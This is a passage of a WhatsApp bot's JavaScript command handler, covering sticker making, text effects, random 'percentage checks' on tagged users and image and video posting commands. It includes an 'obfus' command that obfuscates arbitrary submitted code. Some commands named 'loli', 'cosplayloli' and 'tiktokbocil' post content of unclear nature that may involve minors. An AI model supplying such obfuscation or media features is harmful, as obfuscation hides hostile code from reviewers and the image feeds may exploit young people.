	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await LordVoltage.sendMessage(from,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}}
	break

case 'delsampah':{if (prefix === '.') {
	let path = require('path');
	let directoryPath = path.join();
	fs.readdir(directoryPath, async function (err, files) {
	if (err) {
	console.log('Unable to scan directory: ' + err);
	return reply('Unable to scan directory: ' + err);
	 } 
	let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm") || item.endsWith("opus") || item.endsWith("jpeg"))
	console.log(filteredArray.length); 
	let teks =`Detected ${filteredArray.length} file Memories <3\n\n`
	if(filteredArray.length == 0) return reply(`${teks}`)
	filteredArray.map(function(e, i){
	teks += (i+1)+`. ${e}\n`
	})
	 
	reply(`${teks}`)
	
//	await sleep(2000)
	reply("Deleting Memories files...")
	await filteredArray.forEach(function (file) {
	fs.unlinkSync(file)
	});
	//await sleep(2000)
	reply("Successfully erased all Memories <3")
	 
	});
	  }}
	break 

case 'txtsticker': {if (prefix === '.') {
    if (!q) return replynano('Enter Text');
    const ppnyauser = await LordVoltage.profilePictureUrl(m.sender, 'image').catch(_ => 'https://img1.pixhost.to/images/5719/598093240_spark.png');
    const json = {
        "type": "quote",
        "format": "png",
        "backgroundColor": "#FFFFFF",
        "width": 512,
        "height": 768,
        "scale": 2,
        "messages": [
            {
                "entities": [],
                "avatar": true,
                "from": {
                    "id": 1,
                    "name": pushname,
                    "photo": {
                        "url": ppnyauser
                    }
                },
                "text": q,
                "replyMessage": {}
            }
        ]
    };

    const res = await axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
    });
    const buffer = Buffer.from(res.data.result.image, 'base64');
    const rest = { 
        status: "200", 
        creator: "AdrianTzy",
        result: buffer
    };

    LordVoltage.sendImageAsSticker(m.chat, rest.result, m, {
        packname: `${global.packname}`,
        author: `${global.author}`
    });
}}
break;
case 's':
case 'stiker':
case 'sticker': {if (prefix === '.') {
  if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await LordVoltage.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await LordVoltage.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}}
}
break
case 'quotes':if (prefix === '.') {
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
return replynano(textquotes)}
break
case 'handsomecheck':if (prefix === '.') {
				if (!text) return replynano(`Tag Someone, Example : ${prefix + command} *@SPARK MD*`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
LordVoltage.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })}
					break
case 'beautifulcheck':if (prefix === '.') {
				if (!text) return replynano(`Tag Someone, Example : ${prefix + command} @SPARK MD`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
LordVoltage.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })}
					break
					case 'charactercheck':if (prefix === '.') {
					if (!text) return replynano(`Tag Someone, Example : ${prefix + command} @SPARK MD`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					LordVoltage.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })}
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
 case 'prettycheck':
case 'lovelycheck':
  case 'uglycheck':if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
LordVoltage.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
LordVoltage.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
LordVoltage.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}}
break
case 'obfus': case 'enc': case 'obfuscate':{if (prefix === '.') {
if (!q) return replynano(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(q)
replynano(`Success
${meg.result}`)
}}
break
case 'style': case 'fancy': {if (prefix === '.') {
		let { styletext } = require('./lib/scraper')
		if (!text) return replynano('Enter Query text!')
let anu = await styletext(text)
let teks = `Style Text From ${text}\n\n`
for (let i of anu) {
teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
}
replynano(teks)
	    }}
	    break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{if (prefix === '.') {

if (!q) return replynano(`Example : ${prefix+command} LordVoltage`) 
reply(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
LordVoltage.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}}
break
case 'tiktokgirl':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var asupan = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
LordVoltage.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })}
break
case 'tiktokghea':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var gheayubi = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
LordVoltage.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })}
break
case 'tiktokbocil':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var bocil = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
LordVoltage.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })}
break
case 'tiktoknukhty':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ukhty = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
LordVoltage.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var santuy = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
LordVoltage.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })}
break
case 'tiktokkayes':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var kayes = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
LordVoltage.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })}
break
case 'tiktokpanrika':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var rikagusriani = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
LordVoltage.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })}
break
case 'tiktoknotnot':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })}
break
case 'chinese':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'hijab':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'indo':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'japanese':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'korean':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'malay':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'randomgirl':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'randomboy':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'tHello':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokpics/tHelloland.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'vietnamese':if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'aesthetic':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'antiwork':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'blackpink':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'bike':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'boneka':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'cosplay':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'cat':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'doggo':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'justina':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'kayes':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'kpop':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'notnot':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'car':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/car.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'couplepic':case 'ppcp':case 'couplepicture':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'profilepic':  case 'profilepicture':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'pubg':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'rose':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'ryujin':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'ulzzangboy':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'ulzzanggirl':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'wallpaperphone': case 'wallphone':if (prefix === '.') {
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })}
break
case 'animewallpaper2': case 'animewall2': {if (prefix === '.') {
if (!args.join(" ")) return replynano("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
anu = await wallpaper(args)
result = anu[Math.floor(Math.random() * anu.length)]
LordVoltage.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }}
            break
case 'afk': {if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
if (!text) return replynano(`Example ${prefix+command} want to sleep`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
reply(`${m.pushName} Have Done AFK\n Reason  : ${args.join(" ") ? args.join(" ") : ''}`)
}}
break
case 'animewall': case 'animewallpaper':if (prefix === '.') {
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return replynano('What wallpaper do you want?')
reply(mess.wait)
const wall = new AnimeWallpaper()
    const pages = [1,2,3,4]
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null)
const i = Math.floor(Math.random() * wallpaper.length)    
            await LordVoltage.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
return('Error!')
})}
//LordVoltage.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'neko': {if (prefix === '.') {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      LordVoltage.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!`}, {quoted: m})    
            }}
            break
case 'loli': {if (prefix === '.') {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      LordVoltage.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!`}, {quoted: m})    
            }}
            break
            case 'waifu': {if (prefix === '.') {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      LordVoltage.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!`}, {quoted: m})    
            }}
            break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{if (prefix === '.') {
reply(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
